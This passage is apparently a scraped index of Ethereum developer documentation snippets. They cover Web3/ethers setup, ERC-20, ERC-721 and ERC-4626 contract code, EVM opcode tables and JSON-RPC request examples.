Web3(Web3.HTTPProvider(\"https://cloudflare-eth.com\"))\n\nck_token_addr = \"0x06012c8cf97BEaD5deAe237070F9587f8E7A266d\"    # CryptoKitties Contract\n\nacc_address = \"0xb1690C08E213a35Ed9bAb7B318DE14420FB57d8C\"      # CryptoKitties Sales Auction\n\n# This is a simplified Contract Application Binary Interface (ABI) of an ERC-721 NFT Contract.\n# It will expose only the methods: balanceOf(address), name(), ownerOf(tokenId), symbol(), totalSupply()\nsimplified_abi = [\n    {\n        'inputs': [{'internalType': 'address', 'name': 'owner', 'type': 'address'}],\n        'name': 'balanceOf',\n        'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}],\n        'payable': False, 'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'name',\n        'outputs': [{'internalType': 'string', 'name': '', 'type': 'string'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [{'internalType': 'uint256', 'name': 'tokenId', 'type': 'uint256'}],\n        'name': 'ownerOf',\n        'outputs': [{'internalType': 'address', 'name': '', 'type': 'address'}],\n        'payable': False, 'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'symbol',\n        'outputs': [{'internalType': 'string', 'name': '', 'type': 'string'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [],\n        'name': 'totalSupply',\n        'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}],\n        'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n]\n\nck_extra_abi = [\n    {\n        'inputs': [],\n        'name': 'pregnantKitties',\n        'outputs': [{'name': '', 'type': 'uint256'}],\n        'payable': False, 'stateMutability': 'view', 'type': 'function', 'constant': True\n    },\n    {\n        'inputs': [{'name': '_kittyId', 'type': 'uint256'}],\n        'name': 'isPregnant',\n        'outputs': [{'name': '', 'type': 'bool'}],\n        'payable': False, 'stateMutability': 'view', 'type': 'function', 'constant': True\n    }\n]\n\nck_contract = w3.eth.contract(address=w3.to_checksum_address(ck_token_addr), abi=simplified_abi+ck_extra_abi)\nname = ck_contract.functions.name().call()\nsymbol = ck_contract.functions.symbol().call()\nkitties_auctions = ck_contract.functions.balanceOf(acc_address).call()\nprint(f\"{name} [{symbol}] NFTs in Auctions: {kitties_auctions}\")\n\npregnant_kitties = ck_contract.functions.pregnantKitties().call()\nprint(f\"{name} [{symbol}] NFTs Pregnants: {pregnant_kitties}\")\n```\n\n----------------------------------------\n\nTITLE: EVM Implementation of Token Transfer Event Emission\nDESCRIPTION: This snippet shows the EVM bytecode for emitting the ERC20 Transfer event after completing a token transfer. It includes the sender, recipient, and amount information.\n\nLANGUAGE: evm\nCODE:\n```\nDUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Importing L2 Bridge Interface for Cross-Layer Communication\nDESCRIPTION: Imports the interface for the L2 bridge to enable communication between the L1 and L2 bridges. This allows the L1 bridge to create messages that control the standard bridge on L2.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IL2ERC20Bridge } from \"../../L2/messaging/IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Displaying Technical Requirements FAQ in React/JSX\nDESCRIPTION: A single column in a two-column layout containing FAQ about technical requirements for participating in the Translatathon.\n\nLANGUAGE: jsx\nCODE:\n```\n<TwoColumnContent>\n  <CardContent>\n    <h3>What do I need to participate?</h3>\n    We recommend using a computer to translate since our translation platform, Crowdin, is optimized for desktop.\n  </CardContent>\n</TwoColumnContent>\n```\n\n----------------------------------------\n\nTITLE: Connecting to a Custom Bootnode with Geth\nDESCRIPTION: This command demonstrates how to start a Geth client while specifying a custom bootnode. The enode URL format includes the node ID, IP address, and port of the bootnode you want to connect to.\n\nLANGUAGE: bash\nCODE:\n```\ngeth --bootnodes \"enode://<node ID>@<IP address>:<port>\"\n```\n\n----------------------------------------\n\nTITLE: HTML List of Istanbul EIPs\nDESCRIPTION: HTML list showing all Ethereum Improvement Proposals (EIPs) included in the Istanbul fork, with links to each EIP and brief descriptions of their purposes.\n\nLANGUAGE: html\nCODE:\n```\n<ul>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-152\">EIP-152</a> – <em>allow Ethereum to work with privacy-preserving currency like Zcash.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1108\">EIP-1108</a> – <em>cheaper cryptography to improve <a href=\"/glossary/#gas\">gas</a> costs.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1344\">EIP-1344</a> – <em>protects Ethereum against replay attacks by adding <code>CHAINID</code> <a href=\"/developers/docs/ethereum-stack/#ethereum-virtual-machine\">opcode</a>.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-1884\">EIP-1884</a> – <em>optimising opcode gas prices based on consumption.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-2028\">EIP-2028</a> – <em>reduces the cost of CallData to allow more data in blocks – good for <a href=\"/developers/docs/scaling/#layer-2-scaling\">Layer 2 scaling</a>.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-2200\">EIP-2200</a> – <em>other opcode gas price alterations.</em></li>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Setting up Web3 Connection for NFT Minting\nDESCRIPTION: Initializes the Alchemy Web3 connection using the API URL from environment variables. This setup creates the foundation for interacting with the Ethereum blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n```\n\n----------------------------------------\n\nTITLE: Safe NFT Transfer Function in Vyper\nDESCRIPTION: External function implementing the ERC-721 safeTransferFrom method that ensures the recipient can handle NFTs. If the recipient is a contract, the function verifies that it implements onERC721Received with the correct return value, preventing tokens from being lost.\n\nLANGUAGE: vyper\nCODE:\n```\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n    if _to.is_contract: # check if `_to` is a contract address\n        returnValue: bytes32 = ERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data)\n        # Throws if transfer destination is a contract which does not implement 'onERC721Received'\n        assert returnValue == method_id(\"onERC721Received(address,address,uint256,bytes)\", output_type=bytes32)\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Transaction Signing Request\nDESCRIPTION: This JSON-RPC call shows how to request transaction signing through an Ethereum client API. It demonstrates the account_signTransaction method with a transaction object containing all necessary parameters.\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"id\": 2,\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"account_signTransaction\",\n  \"params\": [\n    {\n      \"from\": \"0x1923f626bb8dc025849e00f99c25fe2b2f7fb0db\",\n      \"gas\": \"0x55555\",\n      \"maxFeePerGas\": \"0x1234\",\n      \"maxPriorityFeePerGas\": \"0x1234\",\n      \"input\": \"0xabcd\",\n      \"nonce\": \"0x0\",\n      \"to\": \"0x07a565b7ed7d7a678680a4c162885bedbb695fe0\",\n      \"value\": \"0x1234\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Mint Function Declaration in Vyper for ERC-721 Tokens\nDESCRIPTION: Function declaration for minting new ERC-721 tokens that returns a boolean success indicator. This is the initial signature of the mint function that requires the recipient address and token ID as parameters.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n```\n\n----------------------------------------\n\nTITLE: React UI Component for Ethereum dApp Interface\nDESCRIPTION: JSX markup for the dApp user interface, including wallet connection button, message display, input field for updating the smart contract, and status notifications.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//the UI of our component\nreturn (\n  <div id=\"container\">\n    <img id=\"logo\" src={alchemylogo}></img>\n    <button id=\"walletButton\" onClick={connectWalletPressed}>\n      {walletAddress.length > 0 ? (\n        \"Connected: \" +\n        String(walletAddress).substring(0, 6) +\n        \"...\" +\n        String(walletAddress).substring(38)\n      ) : (\n        <span>Connect Wallet</span>\n      )}\n    </button>\n\n    <h2 style={{ paddingTop: \"50px\" }}>Current Message:</h2>\n    <p>{message}</p>\n\n    <h2 style={{ paddingTop: \"18px\" }}>New Message:</h2>\n\n    <div>\n      <input\n        type=\"text\"\n        placeholder=\"Update the message in your smart contract.\"\n        onChange={(e) => setNewMessage(e.target.value)}\n        value={newMessage}\n      />\n      <p id=\"status\">{status}</p>\n\n      <button id=\"publishButton\" onClick={onUpdatePressed}>\n        Update\n      </button>\n    </div>\n  </div>\n)\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum Contract Instance using Ethers.js\nDESCRIPTION: Sets up the provider, signer, and contract instance using Ethers.js, which enables interaction with a smart contract deployed on the Ethereum blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Implementation Documentation Comment\nDESCRIPTION: Comprehensive documentation explaining the ERC-20 implementation details, including supply mechanisms, function behavior on failure, event emission, and additional non-standard functions for allowance management.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin guidelines: functions revert instead\n * of returning `false` on failure. This behavior is nonetheless conventional\n * and does not conflict with the expectations of ERC20 applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\n```\n\n----------------------------------------\n\nTITLE: SHR Opcode (Logical Shift Right) in EVM\nDESCRIPTION: The SHR opcode performs a logical right shift operation. It takes a shift amount and a value from the stack, and returns the result of shifting the value right by the specified number of bits, filling with zeros.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nval >> shift\n```\n\n----------------------------------------\n\nTITLE: Fetching the latest block number using callbacks\nDESCRIPTION: Example of using web3.js to query the Ethereum blockchain for the latest block number using the callback pattern.\n\nLANGUAGE: javascript\nCODE:\n```\nvar Web3 = require(\"web3\")\nconst web3 = new Web3(\"https://cloudflare-eth.com\")\n\nweb3.eth.getBlockNumber(function (error, result) {\n  console.log(result)\n})\n```\n\n----------------------------------------\n\nTITLE: Initializing web3.js with a local node\nDESCRIPTION: Creating a new Web3 instance connected to a local Ethereum node or Ganache instance running on localhost port 8545. This setup is common for development environments.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n```\n\n----------------------------------------\n\nTITLE: Defining Smart Contract Address and ABI\nDESCRIPTION: Setting up the Greeter contract address and ABI (Application Binary Interface) needed to interact with the contract on the Holesky testnet.\n\nLANGUAGE: typescript\nCODE:\n```\nconst greeterAddress : Address = \"0xB8f6460Dc30c44401Be26B0d6eD250873d8a50A6\" \nconst greeterABI = [\n    {\n        \"inputs\": [\n            {\n                \"internalType\": \"string\",\n                \"name\": \"_greeting\",\n                \"type\": \"string\"\n            }\n        ],\n        \"stateMutability\": \"nonpayable\",\n        \"type\": \"constructor\"\n    },\n         .\n         .\n         .\n    {\n        \"inputs\": [\n            {\n                \"internalType\": \"string\",\n                \"name\": \"_greeting\",\n                \"type\": \"string\"\n            }\n        ],\n        \"name\": \"setGreeting\",\n        \"outputs\": [],\n        \"stateMutability\": \"nonpayable\",\n        \"type\": \"function\"\n    }\n] as const\n```\n\n----------------------------------------\n\nTITLE: Deposit Event in ERC-4626 Vault (Solidity)\nDESCRIPTION: This event must be emitted when tokens are deposited into the vault via the mint and deposit methods. It records the sender, owner, asset amount and shares amount.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Deposit(\n    address indexed sender,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Final Cleanup and Transaction End in EVM Bytecode\nDESCRIPTION: This code cleans up the stack and ends the transaction successfully with STOP.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Décalage | Opcode |\n| --------:| ------ |\n|       79 | POP    |\n|       7A | POP    |\n|       7B | STOP   |\n```\n\n----------------------------------------\n\nTITLE: Subscribing to Full Pending Transactions in Ethereum using alchemy_newFullPendingTransactions\nDESCRIPTION: Demonstrates how to subscribe to full pending transaction data using the alchemy_newFullPendingTransactions subscription. Unlike the standard web3 subscription that returns only transaction hashes, this returns complete transaction information.\n\nLANGUAGE: json\nCODE:\n```\n>  {\"jsonrpc\":  \"2.0\",  \"id\":  1,  \"method\":  \"eth_subscribe\",  \"params\":  [\"alchemy_newFullPendingTransactions\"]}\n\n<  {\"id\":1,\"result\":\"0x9a52eeddc2b289f985c0e23a7d8427c8\",\"jsonrpc\":\"2.0\"}\n<  {\n      \"jsonrpc\":\"2.0\",\n      \"method\":\"eth_subscription\",\n      \"params\":{\n          \"result\":{\n          \"blockHash\":null,\n          \"blockNumber\":null,\n          \"from\":\"0xa36452fc31f6f482ad823cd1cf5515177d57667f\",\n          \"gas\":\"0x1adb0\",\n          \"gasPrice\":\"0x7735c4d40\",\n          \"hash\":\"0x50bff0736c713458c92dd1848d12f3354149be1363123dae35e94e0f2a9d56bf\",\n\"input\":\"0xa9059cbb0000000000000000000000000d0707963952f2fba59dd06f2b425ace40b492fe0000000000000000000000000000000000000000000015b1111266cfca100000\",\n          \"nonce\":\"0x0\",\n          \"to\":\"0xea38eaa3c86c8f9b751533ba2e562deb9acded40\",\n          \"transactionIndex\":null,\n          \"value\":\"0x0\",\n          \"v\":\"0x26\",\n          \"r\":\"0x195c2c1ed126088e12d290aa93541677d3e3b1d10f137e11f86b1b9227f01e3b\",\n          \"s\":\"0x60fc4edbf1527832a2a36dbc1e63ed6193a6eee654472fbebbf88ef1750b5344\"},\n          \"subscription\":\"0x9a52eeddc2b289f985c0e23a7d8427c8\"\n      }\n  }\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_mining en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour vérifier si le client est en train de miner activement de nouveaux blocs en utilisant la méthode eth_mining. Cette méthode peut ne pas être disponible dans certains clients depuis La Fusion.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_mining\",\"params\":[],\"id\":71}'\n//\n{\n  \"id\":71,\n  \"jsonrpc\": \"2.0\",\n  \"result\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum Contract Instance using Ethers.js\nDESCRIPTION: Sets up the provider, signer, and contract instance using Ethers.js, which enables interaction with a smart contract deployed on the Ethereum blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: Example Deployment Output Showing Contract Address\nDESCRIPTION: Expected terminal output after successful contract deployment, displaying the address where the contract was deployed. This address should be saved for future interaction with the contract.\n\nLANGUAGE: bash\nCODE:\n```\nContract deployed to address: 0x6cd7d44516a20882cEa2DE9f205bF401c0d23570\n```\n\n----------------------------------------\n\nTITLE: Constructor for Uniswap V2 Factory Contract\nDESCRIPTION: The constructor function that initializes the factory by setting the feeToSetter address, which is the only address authorized to modify fee settings.\n\nLANGUAGE: solidity\nCODE:\n```\n    constructor(address _feeToSetter) public {\n        feeToSetter = _feeToSetter;\n    }\n```\n\n----------------------------------------\n\nTITLE: Referencing gamesInProgress Map for Game State Storage in TypeScript\nDESCRIPTION: A reference to a map variable named 'gamesInProgress' stored in memory on the server, which tracks games that are currently in progress. This is noted as a simplified approach for a tutorial, with the recommendation to use a database in production systems.\n\nLANGUAGE: typescript\nCODE:\n```\ngamesInProgress\n```\n\n----------------------------------------\n\nTITLE: Defining Solidity Version for ERC-20 Contract\nDESCRIPTION: Specifies the Solidity compiler version compatibility for the ERC-20 token contract. This contract requires Solidity version 0.6.0 or higher, but less than 0.8.0.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.8.0;\n```\n\n----------------------------------------\n\nTITLE: Connecting to Ethereum Network with Infura Provider\nDESCRIPTION: JavaScript code to establish a connection to the Ropsten testnet using Infura as a provider.\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.ethersProvider = new ethers.providers.InfuraProvider(\"ropsten\")\n```\n\n----------------------------------------\n\nTITLE: Creating a Wallet Client for Transaction Signing\nDESCRIPTION: Initializing a Viem wallet client with the account created from the private key, which can sign and send transactions to the Holesky testnet.\n\nLANGUAGE: typescript\nCODE:\n```\nconst walletClient = createWalletClient({ \n    account,\n    chain: holesky, \n    transport: http(), \n}) \n```\n\n----------------------------------------\n\nTITLE: Simulating Deposit Effects in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function allows users to simulate the effects of their deposit at the current block, showing how many shares they would receive.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewDeposit(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: ETH Transfer with Error Handling\nDESCRIPTION: Safely transfers Ether to a specified address with error checking. Uses a low-level call with empty data to send ETH to the target address, throwing an error if the transfer fails.\n\nLANGUAGE: solidity\nCODE:\n```\n    function safeTransferETH(address to, uint256 value) internal {\n        (bool success, ) = to.call{value: value}(new bytes(0));\n        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Ethereum dApp Event Handlers and Lifecycle Methods\nDESCRIPTION: Core functions for the dApp including component lifecycle, smart contract and wallet event listeners, and user interaction handlers that need implementation.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//called only once\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nfunction addSmartContractListener() {\n  //TODO: implement\n}\n\nfunction addWalletListener() {\n  //TODO: implement\n}\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onUpdatePressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Approve and TransferFrom Functions with Optimized Calldata in JavaScript\nDESCRIPTION: Test code for the optimized approve and transferFrom functions using compact calldata. This demonstrates how to construct and send transactions with compact data for these operations.\n\nLANGUAGE: javascript\nCODE:\n```\n// approval and transferFrom\nconst approveTx = {\n  to: cdi.address,\n  data: \"0x03\" + poorSigner.address.slice(2, 42) + \"00FF\",\n}\nawait (await signer.sendTransaction(approveTx)).wait()\n\nconst destAddr2 = \"0xE1165C689C0c3e9642cA7606F5287e708d846206\"\n\nconst transferFromTx = {\n  to: cdi.address,\n  data: \"0x04\" + signer.address.slice(2, 42) + destAddr2.slice(2, 42) + \"00FF\",\n}\nawait (await poorSigner.sendTransaction(transferFromTx)).wait()\n\n// Check the approve / transferFrom combo was done correctly\nexpect(await token.balanceOf(destAddr2)).to.equal(255)\n```\n\n----------------------------------------\n\nTITLE: Client New Game Button\nDESCRIPTION: The client displays a new game button when there is no active game or the gameId is zero.\n\nLANGUAGE: TypeScript\nCODE:\n```\n// From App.tsx line 175\n// Displays new game button when no active game\n```\n\n----------------------------------------\n\nTITLE: EVM SWAP and LOG Operations Reference Table\nDESCRIPTION: A reference table describing Ethereum Virtual Machine opcodes for SWAP1-SWAP16 (stack manipulation) and LOG0-LOG4 (event logging) operations. The table includes opcode values, gas costs, stack effects, and operation descriptions.\n\nLANGUAGE: plaintext\nCODE:\n```\n|  90   | SWAP1          |                                                3                                                | `a, b`                                           | `b, a`                                       |                                                                               |                                                                                                                                                                       |\n|  91   | SWAP2          |                                                3                                                | `a, _, b`                                        | `b, _, a`                                    |                                                                               |                                                                                                                                                                       |\n|  92   | SWAP3          |                                                3                                                | `a, _, _, b`                                     | `b, _, _, a`                                 |                                                                               |                                                                                                                                                                       |\n|  93   | SWAP4          |                                                3                                                | `a, _, _, _, b`                                  | `b, _, _, _, a`                              |                                                                               |                                                                                                                                                                       |\n|  94   | SWAP5          |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  95   | SWAP6          |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  96   | SWAP7          |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  97   | SWAP8          |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  98   | SWAP9          |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  99   | SWAP10         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9A   | SWAP11         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9B   | SWAP12         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9C   | SWAP13         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9D   | SWAP14         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9E   | SWAP15         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  9F   | SWAP16         |                                                3                                                | `a, ..., b`                                      | `b, ..., a`                                  |                                                                               |                                                                                                                                                                       |\n|  A0   | LOG0           |         [A8](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a8-log-operations)          | `ost, len`                                       | `.`                                          |                                                                               | LOG0(memory[ost:ost+len-1])                                                                                                                                           |\n|  A1   | LOG1           |         [A8](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a8-log-operations)          | `ost, len, topic0`                               | `.`                                          |                                                                               | LOG1(memory[ost:ost+len-1], topic0)                                                                                                                                   |\n|  A2   | LOG2           |         [A8](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a8-log-operations)          | `ost, len, topic0, topic1`                       | `.`                                          |                                                                               | LOG2(memory[ost:ost+len-1], topic0, topic1)                                                                                                                           |\n|  A3   | LOG3           |         [A8](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a8-log-operations)          | `ost, len, topic0, topic1, topic2`               | `.`                                          |                                                                               | LOG3(memory[ost:ost+len-1], topic0, topic1, topic2)                                                                                                                   |\n|  A4   | LOG4           |         [A8](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a8-log-operations)          | `ost, len, topic0, topic1, topic2, topic3`       | `.`                                          |                                                                               | LOG4(memory[ost:ost+len-1],&#160;topic0,&#160;topic1,&#160;topic2,&#160;topic3)                                                                                       |\n```\n\n----------------------------------------\n\nTITLE: STATICCALL Opcode (0xFA) Memory Effect in EVM\nDESCRIPTION: Similar to CALL but disallows any state modifications. Copies return data from the call into memory at the specified offset and length.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Defining L1 Token Reference Function in IL2StandardERC20\nDESCRIPTION: Defines a function to retrieve the corresponding L1 token address for an L2 token, creating a link between paired tokens across layers.\n\nLANGUAGE: solidity\nCODE:\n```\ninterface IL2StandardERC20 is IERC20, IERC165 {\n    function l1Token() external returns (address);\n```\n\n----------------------------------------\n\nTITLE: Calculating Transaction Fees Before London Upgrade\nDESCRIPTION: Example of how transaction fees were calculated before the London Upgrade, showing the simple gas units multiplied by gas price formula.\n\nLANGUAGE: markdown\nCODE:\n```\nLet's say Alice had to pay Bob 1 ETH. In the transaction, the gas limit is 21,000 units, and the gas price is 200 gwei.\n\nThe total fee would have been: `Gas units (limit) * Gas price per unit` i.e `21,000 * 200 = 4,200,000 gwei` or 0.0042 ETH\n```\n\n----------------------------------------\n\nTITLE: Token Exchange Quote Calculation\nDESCRIPTION: Calculates the equivalent amount of token B for a given amount of token A based on pair reserves. This function provides a pure exchange rate calculation without accounting for any fees.\n\nLANGUAGE: solidity\nCODE:\n```\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    }\n```\n\n----------------------------------------\n\nTITLE: Token Exchange Quote Calculation\nDESCRIPTION: Calculates the equivalent amount of token B for a given amount of token A based on pair reserves. This function provides a pure exchange rate calculation without accounting for any fees.\n\nLANGUAGE: solidity\nCODE:\n```\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    }\n```\n\n----------------------------------------\n\nTITLE: STATICCALL Operation Memory Effect in Ethereum VM\nDESCRIPTION: The STATICCALL opcode (0xFA) performs a message call that disallows state modifications. It copies the return data to the specified memory location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Starting the Server Component\nDESCRIPTION: Command to start the TypeScript server that will listen to blockchain events and respond with transactions.\n\nLANGUAGE: shell\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Pragma Directive for Solidity Version Compatibility\nDESCRIPTION: Specifies the compatible Solidity compiler versions for the contracts. The code supports any Solidity version greater than 0.5.0 and less than 0.9.0.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >0.5.0 <0.9.0;\n```\n\n----------------------------------------\n\nTITLE: Importing web3.js in Node.js\nDESCRIPTION: Code snippet showing how to import the Web3 library in a Node.js script or Browserify frontend project after installation.\n\nLANGUAGE: javascript\nCODE:\n```\nconst Web3 = require(\"web3\")\n```\n\n----------------------------------------\n\nTITLE: Implementing a Name Registration System in Serpent\nDESCRIPTION: A simple Serpent implementation of a name registration system on Ethereum. The function allows users to register a name with an associated value, but only if the name hasn't been registered before.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Subscribing to Events with Web3.js in JavaScript\nDESCRIPTION: Code example showing how to subscribe to contract events using Web3.js. This demonstrates the traditional approach to listening for blockchain events before using The Graph, which requires handling multiple callback scenarios.\n\nLANGUAGE: javascript\nCODE:\n```\nGameContract.events.BetPlaced({\n    fromBlock: 0\n}, function(error, event) { console.log(event); })\n.on('data', function(event) {\n    // event fired\n})\n.on('changed', function(event) {\n    // event was removed again\n})\n.on('error', function(error, receipt) {\n    // tx rejected\n});\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de net_listening en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour vérifier si le client est en mode écoute des connexions réseau en utilisant la méthode net_listening.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"net_listening\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\":\"2.0\",\n  